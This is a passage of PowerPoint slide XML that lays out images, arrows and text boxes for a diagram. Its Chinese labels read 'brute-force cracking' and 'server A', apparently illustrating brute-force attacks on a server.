              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9570059" y="3410238"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="15" name="图片 14">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C3CE1C3-836C-614F-AC6A-CF3DA9D964F5}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8599903" y="3602965"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="16" name="图片 15">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59F82A05-3020-0842-9131-9F3120C50640}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9234820" y="4189187"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="17" name="图片 16">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3C846FB8-90B6-8D4D-84A8-1EA5D9E27FA6}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10013985" y="4311848"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="18" name="图片 17">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE655B7F-579B-C24A-89B8-179C28C48795}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10136197" y="1621094"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="19" name="图片 18">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2082EBDF-69C0-394E-9206-9CF3DA7F3D6E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10727212" y="1996031"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="20" name="图片 19">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00E2DAB8-3ED6-7C47-A268-A249C08C9E6F}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9757056" y="2188758"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="21" name="图片 20">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0A65A6D-3FEB-174B-82FC-1E0150D56FC6}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10380822" y="2897641"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="22" name="图片 21">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2BBB8CC7-21BD-8043-A63F-BCF7A6CB9FD2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11171138" y="2897641"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="23" name="图片 22">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E00B0897-A440-3C44-8EDF-7F1EC8A27FFB}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10777959" y="3329171"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="24" name="图片 23">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6E558D1-D2D4-9842-AAC7-85EFD625A0E0}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11368974" y="3704108"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="25" name="图片 24">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8180C0C-79B1-4848-B565-0B6DF0DFF32F}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10398818" y="3896835"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="26" name="图片 25">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58AA1C82-702D-9B45-95F7-AF4F30B5A01B}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11022584" y="4605718"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="27" name="图片 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CADB6286-AD0A-E940-847D-C28025856564}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8770446" y="4242292"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="28" name="图片 27">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{665E3B59-4257-914F-B298-05D182C4F7BD}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9361461" y="4617229"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="29" name="图片 28">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5704B927-9D19-CF4C-A85A-8057A6184B9C}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8638376" y="4843308"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="30" name="图片 29">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C88FBD8F-5B2E-1D4A-950C-428F85EF5B2D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="9015071" y="5518839"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="31" name="图片 30">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F51E4FFB-81D1-9D4E-BB47-5106B205E7FA}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10482587" y="4337021"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="32" name="图片 31">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD958F28-9D51-7742-AF26-589B8C342094}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10136197" y="5238631"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
        </p:grpSp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="50179" name="图片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1368134" flipH="1">
              <a:off x="4130278" y="4165998"/>
              <a:ext cx="1309688" cy="1135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0180" name="组合 113"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3930254" y="3655215"/>
              <a:ext cx="627459" cy="1050166"/>
              <a:chOff x="6603240" y="2967722"/>
              <a:chExt cx="835731" cy="1396803"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="35" name="直接箭头连接符 92">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C874F502-68B2-A74D-81D8-A1307F67E743}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6620684" y="3172010"/>
                <a:ext cx="818287"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6" name="图片 35">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{628A2753-A0D9-4A4E-80EF-66DE094342E9}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6825753" y="2967722"/>
                <a:ext cx="254913" cy="340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0219" name="文本框 36"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="6603240" y="3259234"/>
                <a:ext cx="590788" cy="1105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200" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="FF0000"/>
                    </a:solidFill>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>暴力破解</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="38" name="曲线连接符 37">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{974A49AA-1AFB-8349-8A12-DF8AD9654710}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm rot="5400000" flipH="1" flipV="1">
              <a:off x="4370784" y="2600326"/>
              <a:ext cx="940594" cy="1133475"/>
            </a:xfrm>
            <a:prstGeom prst="curved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0182" name="图片 3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24604">
              <a:off x="4366023" y="2849167"/>
              <a:ext cx="1067990" cy="896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3" name="图片 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323913">
              <a:off x="4444604" y="3136107"/>
              <a:ext cx="877490" cy="735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4" name="图片 4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191945">
              <a:off x="4489847" y="3373041"/>
              <a:ext cx="722709" cy="607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5" name="图片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H="1">
              <a:off x="4250532" y="4000501"/>
              <a:ext cx="1069181" cy="927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6" name="图片 4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9909906" flipH="1">
              <a:off x="4425554" y="3902869"/>
              <a:ext cx="988219"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图片 43">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{740E9D44-8346-5C49-A975-6485A34B247B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId5"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1103755" y="2352680"/>
              <a:ext cx="426578" cy="455112"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
            <a:effectLst>
              <a:softEdge rad="112500"/>
            </a:effectLst>
          </p:spPr>
        </p:pic>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="50188" name="组合 107"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1206103" y="2768204"/>
              <a:ext cx="355997" cy="583406"/>
              <a:chOff x="1974680" y="1937287"/>
              <a:chExt cx="475234" cy="779120"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="46" name="直接箭头连接符 11">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{561DA307-775F-7B49-96CB-EFA215A443CB}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="2141568" y="1937287"/>
                <a:ext cx="0" cy="7791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7" name="图片 46">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1306E67-C7AD-C445-ADF9-DFF43621FB03}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1974680" y="2148571"/>
                <a:ext cx="254913" cy="340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0216" name="文本框 47"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2080137" y="2056097"/>
                <a:ext cx="369777" cy="532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600" b="1">
                    <a:solidFill>
                      <a:srgbClr val="FF0000"/>
                    </a:solidFill>
                    <a:latin typeface="微软雅黑" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                  </a:rPr>
                  <a:t>暴力破解</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="50189" name="组合 108"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="829866" y="3326605"/>
              <a:ext cx="1214438" cy="697145"/>
              <a:chOff x="1473900" y="2682016"/>
              <a:chExt cx="1619367" cy="930302"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="50" name="图片 49">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{983C8195-EA86-E548-B016-3810D017E077}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId2"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="1863411" y="2682016"/>
                <a:ext cx="466633" cy="537393"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:effectLst>
                <a:softEdge rad="112500"/>
              </a:effectLst>
            </p:spPr>
          </p:pic>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="50213" name="文本框 50"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1473900" y="3201607"/>
                <a:ext cx="1619367" cy="410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1400" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="0033CC"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>A</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="0033CC"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>服务器</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="is-IS" altLang="zh-CN" sz="1400" b="1" dirty="0">
                    <a:solidFill>
                      <a:srgbClr val="0033CC"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t> </a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="52" name="矩形 51">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDA18BB0-262D-6E40-B1AE-877E4D0E12C4}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="860126" y="2038350"/>
              <a:ext cx="1055097" cy="369332"/>
